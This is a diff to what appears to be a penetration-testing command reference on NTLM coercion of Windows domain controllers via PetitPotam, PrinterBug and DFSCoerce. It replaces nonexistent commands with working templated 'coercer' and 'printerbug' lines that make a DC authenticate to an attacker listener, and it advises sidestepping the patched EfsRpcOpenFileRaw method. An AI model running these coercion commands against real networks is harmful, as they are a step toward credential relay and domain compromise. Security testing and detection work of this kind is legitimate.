@@ -18,11 +18,17 @@ printerbug the MS-RPRN spooler, DFSCoerce the MS-DFSNM namespace interface;
 pipe (`efsrpc`/`lsarpc`/`samr`/`lsass`/`netlogon`, `spoolss`, `netdfs`
 respectively), which is what the paired detection keys on — so if one vector is
 patched or filtered, try the others before assuming the target is hardened.
-DFSCoerce only works against domain controllers. Here `{{rhost}}` is the DC being
-coerced and `{{lhost}}` is your listener.
+DFSCoerce only works against domain controllers. Two of the three vectors have no
+packaged command of their own — there is no `impacket-petitpotam` (PetitPotam is
+topotam/PetitPotam; Kali packages no `petitpotam` either), and `dfscoerce` is
+Wh04m1001/DFSCoerce, a git clone rather than a binary on PATH. `coercer` implements
+both as MS-EFSR and MS-DFSNM, which is why two of the lines below are the same tool
+under different filters. Filter EFSRPC on `Efs`, the whole method family, rather than
+the single `EfsRpcOpenFileRaw` method, which is patched on a current DC. Here
+`{{rhost}}` is the DC being coerced and `{{lhost}}` is your listener.
 
 ```sh
-impacket-petitpotam {{lhost}} {{rhost}}
+coercer coerce -t {{rhost}} -l {{lhost}} -u {{user}} -p {{password}} -d {{domain}} --filter-method-name Efs
 printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
-dfscoerce -u {{user}} -p {{password}} -d {{domain}} {{lhost}} {{rhost}}
+coercer coerce -t {{rhost}} -l {{lhost}} -u {{user}} -p {{password}} -d {{domain}} --filter-protocol-name MS-DFSNM
 ```
